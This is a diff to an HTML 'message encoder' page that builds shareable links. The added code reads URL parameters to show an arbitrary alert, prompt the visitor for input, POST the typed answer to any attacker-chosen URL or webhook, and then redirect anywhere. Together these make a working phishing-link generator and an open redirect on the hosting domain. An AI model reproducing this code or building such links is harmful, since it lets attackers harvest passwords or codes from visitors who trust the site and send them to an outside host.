@@ -321,6 +321,11 @@
       font-size: 40px;
       padding: 15px;
     }
+    .largeinp {
+      display:block;
+      width: 100%;
+      margin: 20px 0;
+    }
     #um-inputmsg {height:calc(100vh - 150px);}
   </style>
   <meta charset="utf-8">
@@ -330,21 +335,74 @@
 <body lang="en">
   <h1>Your Message:</h1>
   <textarea id="um-inputmsg" class="um-blockarea" placeholder="Input"></textarea>
+  <input type="text" placeholder="Redirection" id="um-red" class="largeinp"></input>
+  <input type="text" placeholder="Alert" id="um-alert" class="largeinp"></input>
+  <input type="text" placeholder="Prompt" id="um-prmt" class="largeinp"></input>
+  <div class="slidercontainer" title="Is the prompt link a webhook?">
+    <label class="switch">
+      <input type="checkbox" id="um-ishook">
+      <span class="slider round"></span>
+    </label>
+    <div class="vl"></div>
+    <label for="um-ishook" class="sliderlabel">Is Webhook?</label>
+  </div>
+  <input type="text" placeholder="Prompt link (POST)" id="um-plink" class="largeinp"></input>
   <div class="centeritem">
     <button class="button largebtn" id="um-activate">Encode</button>
   </div>
   <textarea id="um-outputmsg" class="um-blockarea" placeholder="Output"></textarea>
-  <footer>Copyright 2025 Pacifiky. All rights reserved.<br/>Licenced under CC BY-NC-SA 4.0</footer>
   <script>
     const activ = document.getElementById("um-activate");
     const inputmsg = document.getElementById("um-inputmsg");
     const outputmsg = document.getElementById("um-outputmsg");
+    const redict = document.getElementById("um-red");
+    const alerttext = document.getElementById("um-alert");
+    const prompttext = document.getElementById("um-prmt");
+    const prompturl = document.getElementById("um-plink");
+    const ishook = document.getElementById("um-ishook");
     const params = new URLSearchParams(window.location.search);
     const msg = params.get("m");
-    if(msg){inputmsg.value = msg};
+    const red = params.get("r");
+    const ale = params.get("a");
+    const pro = params.get("p");
+    const prourl = params.get("pu");
+    const prohook = params.get("wh");
+    if(msg){inputmsg.value = msg;}
+    if(ale){alert(ale);alerttext.value=ale;}
+    if(pro){
+      prompttext.value = pro;
+      const proval = prompt(pro);
+      if(prourl){
+        prompturl.value = prourl;
+        ishook.checked = prohook!=null;
+        fetch(prourl, {
+          method: "POST",
+          body: (prohook != null ? JSON.stringify({content: proval}) : proval),
+          headers: {
+            "Content-type": "application/json; charset=UTF-8"
+          }
+        }).then(()=>{
+          if(red){window.location.href = red;}
+        });
+      }
+    }
+    if(red && !prourl){window.location.href = red;/*redict.value=red;*/}
     activ.addEventListener("click",()=>{
-      outputmsg.value = window.location.origin + window.location.pathname + "?m=" + encodeURIComponent(inputmsg.value);
+      let ostr = window.location.origin + window.location.pathname+"?";
+      if(inputmsg.value){ostr+="m="+encodeURIComponent(inputmsg.value)+"&";}
+      if(redict.value){ostr+="r="+encodeURIComponent(redict.value)+"&";}
+      if(alerttext.value){ostr+="a="+encodeURIComponent(alerttext.value)+"&";}
+      if(prompttext.value){
+        ostr+="p="+encodeURIComponent(prompttext.value)+"&";
+        if(prompturl.value){
+          ostr+="pu="+encodeURIComponent(prompturl.value)+"&";
+          if(ishook.checked){ostr+="wh&";}
+        }
+      }
+      outputmsg.value = ostr.substr(0,ostr.length-1);
     });
+    outputmsg.value = window.location.href;
   </script>
+  <footer>Copyright 2025 Pacifiky. All rights reserved.<br/>Licenced under CC BY-NC-SA 4.0</footer>
 </body>
 </html>
